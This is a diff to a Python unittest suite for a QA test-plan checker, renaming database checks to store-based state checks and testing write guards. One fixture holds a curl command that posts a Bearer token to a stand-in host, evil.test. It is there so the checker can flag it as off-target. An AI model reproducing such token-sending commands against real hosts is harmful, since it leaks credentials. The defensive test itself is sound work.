@@ -111,7 +111,7 @@ class PlanTests(unittest.TestCase):
         self.assertEqual(create.expected.statuses, [201])
         self.assertEqual([edge.statuses for edge in create.edges], [[422], [401]])
         self.assertEqual(create.tokens, ["QA_TAG", "QA_NEW_PASSWORD", "QA_USER_ID"])
-        self.assertIn("SELECT COUNT(id)", create.db_check)
+        self.assertIn("SELECT COUNT(id)", create.state_checks[0].text)
         self.assertEqual(profile.urls, ["http://127.0.0.1:54321/auth/v1/user", "http://127.0.0.1:54321/auth/v1/signup"])
         self.assertIn("QA_NEW_PASSWORD", profile.tokens)
 
@@ -159,7 +159,7 @@ $QA_IGNORED_AGAIN https://external.test
 curl -X POST http://evil.test/x -H "Authorization: Bearer $QA_NOPE_TOKEN"
 {fence}
 - **Expected:** 400 invalid request. (src/api.py:400)
-- **DB Check:** `SELECT COUNT(id) FROM cvs`
+- **State Check:** main: `SELECT COUNT(id) FROM cvs`
 ### BE-02: Fetch
 - **Writes:** no
 - **Method:** GET /cvs
@@ -171,7 +171,7 @@ curl -X POST http://evil.test/x -H "Authorization: Bearer $QA_NOPE_TOKEN"
                 self.assertEqual(scenario.urls, ["http://evil.test/x"])
                 self.assertEqual(scenario.tokens, ["QA_NOPE_TOKEN"])
                 self.assertEqual(scenario.expected.statuses, [400])
-                self.assertEqual(scenario.db_check, "`SELECT COUNT(id) FROM cvs`")
+                self.assertEqual(scenario.state_checks[0].text, "`SELECT COUNT(id) FROM cvs`")
                 result = check_plan(parsed, self.config())
                 self.assertFalse(result["ok"])
                 self.assertEqual(result["off_target"], [{
@@ -182,14 +182,15 @@ curl -X POST http://evil.test/x -H "Authorization: Bearer $QA_NOPE_TOKEN"
                     "scenario": "BE-01",
                     "reason": "tokens and cookies are obtained by the tester; use $QA_NOPE_EMAIL and $QA_NOPE_PASSWORD",
                 }])
-                self.assertEqual(result["db_checks"], ["BE-01"])
-                self.assertTrue(result["missing"]["database"])
+                self.assertEqual(result["state_checks"], {"BE-01": []})
+                self.assertEqual(result["missing"]["stores"], ["main"])
 
-    def test_fixture_checks_targets_registered_users_values_and_database(self) -> None:
+    def test_fixture_checks_targets_users_values_and_stores(self) -> None:
         config = self.config('mutations = "allow"\n' + '''[env.values]
 SUPABASE_ANON_KEY = "literal:public-key"
-[env.database]
-kind = "postgres"
+[env.stores.supabase]
+kind = "sql"
+engine = "postgres"
 host = "127.0.0.1"
 port = 54322
 user = "postgres"
@@ -202,7 +203,7 @@ password = "literal:postgres"
         self.assertEqual(result["users"], [])
         self.assertEqual(result["registrations"], ["other", "user"])
         self.assertEqual(result["values"], ["SUPABASE_ANON_KEY"])
-        self.assertEqual(result["db_checks"], ["BE-01"])
+        self.assertEqual(result["state_checks"], {"BE-01": ["supabase", "supabase"]})
         self.assertEqual(result["guarded"], [])
 
     def test_resolve_selects_newest_branch_match_not_newest_other_branch(self) -> None:
@@ -341,15 +342,45 @@ password = "literal:postgres"
                     self.assertEqual(result["users"], ["admin"])
                     self.assertEqual(result["missing"]["users"], [])
 
+    def test_state_checks_parse_store_prefix_repeat_and_resolve_the_single_store(self) -> None:
+        config = self.config('[env.stores.main]\nkind="sql"\nengine="sqlite"\npath="qa.sqlite"\n')
+        parsed = parse_plan(self.plan(SCENARIO + '- **State Check:** `main`: SELECT 1 → 1\n- **State Check:** SELECT 2 → 2\n'))
+        self.assertIsNone(parsed.scenarios[0].state_checks[1].store)
+        self.assertEqual(check_plan(parsed, config)["state_checks"], {"BE-01": ["main", "main"]})
+
+    def test_unprefixed_state_check_with_several_stores_is_a_plan_error(self) -> None:
+        result = self.check(SCENARIO + '- **State Check:** SELECT 1 → 1\n',
+                            '[env.stores.main]\nkind="sql"\nengine="sqlite"\npath="qa.sqlite"\n[env.stores.cache]\nkind="redis"\nhost="localhost"\n')
+        self.assertEqual(result["plan_errors"], [{"scenario": "BE-01", "reason": "state check must name its store"}])
+        self.assertFalse(result["ok"])
+
+    def test_unknown_store_is_a_config_gap(self) -> None:
+        result = self.check(SCENARIO + '- **State Check:** shadow: SELECT 1 → 1\n')
+        self.assertEqual(result["missing"]["stores"], ["shadow"])
+        self.assertFalse(result["ok"])
+
+    def test_fe_state_check_is_a_plan_error(self) -> None:
+        result = self.check('### FE-01: UI\n- **Writes:** no\n- **URL:** /items\n- **State Check:** main: SELECT 1 → 1\n',
+                            '[env.stores.main]\nkind="sql"\nengine="sqlite"\npath="qa.sqlite"\n')
+        self.assertEqual(result["plan_errors"], [{"scenario": "FE-01", "reason": "state checks are BE-only"}])
+        self.assertFalse(result["ok"])
+
+    def test_sql_and_redis_writes_in_state_checks_count_as_writes(self) -> None:
+        extra = 'mutations="deny"\n[env.stores.main]\nkind="sql"\nengine="sqlite"\npath="qa.sqlite"\n[env.stores.cache]\nkind="redis"\nhost="localhost"\n'
+        for query, guarded in (("main: DELETE FROM t → 0", ["BE-01"]), ("cache: SET k v → OK", ["BE-01"]), ("cache: GET k → v", [])):
+            with self.subTest(query=query):
+                result = self.check(SCENARIO + f'- **State Check:** {query}\n', extra)
+                self.assertEqual(result["guarded"], guarded)
+
     def test_unknown_values_are_config_gaps(self) -> None:
         result = self.check(SCENARIO + "- **Headers:** $QA_FOO\n")
         self.assertEqual(result["missing"]["values"], ["FOO"])
 
-    def test_missing_target_default_and_database_are_config_gaps(self) -> None:
-        result = self.check(SCENARIO + '- **Target:** absent\n- **DB Check:** `SELECT COUNT(id) FROM cvs`\n')
+    def test_missing_target_default_and_stores_are_config_gaps(self) -> None:
+        result = self.check(SCENARIO + '- **Target:** absent\n- **State Check:** main: `SELECT COUNT(id) FROM cvs`\n')
         self.assertEqual(result["missing"]["targets"], ["absent"])
-        self.assertTrue(result["missing"]["database"])
-        self.assertEqual(result["db_checks"], ["BE-01"])
+        self.assertEqual(result["missing"]["stores"], ["main"])
+        self.assertEqual(result["state_checks"], {"BE-01": []})
         self.put('version=1\n[env.targets]\napp="http://localhost:8000"\nsupabase="http://127.0.0.1:54321"\n[qa]\n', ".av/config.toml")
         for section, body, target in (
             ("BE", SCENARIO, "backend"),
@@ -455,13 +486,13 @@ password = "literal:postgres"
         result = self.check(body, 'mutations="deny"\n')
         self.assertEqual(result["guarded"], ["BE-01"])
 
-    def test_deny_guards_writes_in_methods_preconditions_steps_edges_and_db(self) -> None:
+    def test_deny_guards_writes_in_methods_preconditions_steps_edges_and_state(self) -> None:
         for body in (
             SCENARIO.replace("GET", "POST"),
             SCENARIO + "- **Preconditions:** POST /cvs creates the resource.\n",
             SCENARIO + "- **Steps:**\n  1. PATCH /cvs/1\n",
             SCENARIO.replace("Invalid token: 401", "DELETE /cvs/1: 400"),
-            SCENARIO + '- **DB Check:** `UPDATE cvs SET title = 1`\n',
+            SCENARIO + '- **State Check:** main: `UPDATE cvs SET title = 1`\n',
         ):
             with self.subTest(body=body):
                 result = self.check(body, 'mutations="deny"\n')
